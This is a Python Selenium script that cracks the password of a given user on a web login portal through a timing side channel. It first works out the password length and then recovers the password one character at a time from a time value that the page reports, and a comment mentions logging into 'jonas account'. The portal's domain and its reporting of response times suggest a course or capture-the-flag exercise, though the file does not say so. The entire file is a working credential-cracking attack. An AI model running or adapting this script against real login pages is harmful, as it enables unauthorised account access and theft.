import string
import time
import math
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.common.exceptions import NoSuchElementException
import re


def find_number_in_string(input_string):
    # Define a regex pattern to match numbers
    number_pattern = re.compile(r'\d+')

    # Use findall to find all occurrences of numbers in the string
    numbers_found_array = number_pattern.findall(input_string)
    number_found_string = numbers_found_array[0]
    number_found = int(number_found_string)

    return number_found


def password_finder(input_username):
    driver = webdriver.Chrome()

    driver.get('https://portal.regjeringen.uiaikt.no/')  # digkala login page

    username_field = driver.find_element(By.NAME, 'username')
    password_field = driver.find_element(By.NAME, 'password')
    login_button = driver.find_element(By.XPATH, '//button[@type="submit" and contains(@class, "btn-primary")]')

    username_field.send_keys(input_username)

    all_characters = string.printable
    password_characters = [char for char in all_characters]

    correct_password = ""  # Will fill up with the correct characters
    filler_password = ""  # Will decrease as correct characters are found, appended on correct_password
    total_time = len(correct_password) + 1

    password_length = 1
    while True:
        password_to_check = "a" * password_length
        password_field.clear()
        password_field.send_keys(password_to_check)
        login_button.click()
        time.sleep(0.2)
        time_check = find_number_in_string(driver.find_element(By.ID, "responseMessage").text)
        if time_check > 0:
            print("Password length: " + str(password_length))
            break
        password_length += 1

    print("Finding password:")
    for i in range(password_length-total_time):
        filler_password += "a"

    for i in range(len(filler_password)):
        for character in password_characters:
            password_to_check = correct_password + character + filler_password
            password_field.clear()
            password_field.send_keys(password_to_check)
            login_button.click()
            time.sleep(0.2)
            try:
                time_check = find_number_in_string(driver.find_element(By.ID, "responseMessage").text)
                if time_check > total_time:
                    # Correct character!
                    correct_password += character
                    filler_password = filler_password[1:]
                    total_time += 1
                    print(correct_password)
                    break
            except NoSuchElementException:
                # The HTML element for response message could not be found,
                # meaning we most likely logged in to jonas account.
                # Therefore, we print the password that was used to log in
                print("Correct password: " + password_to_check)
                return

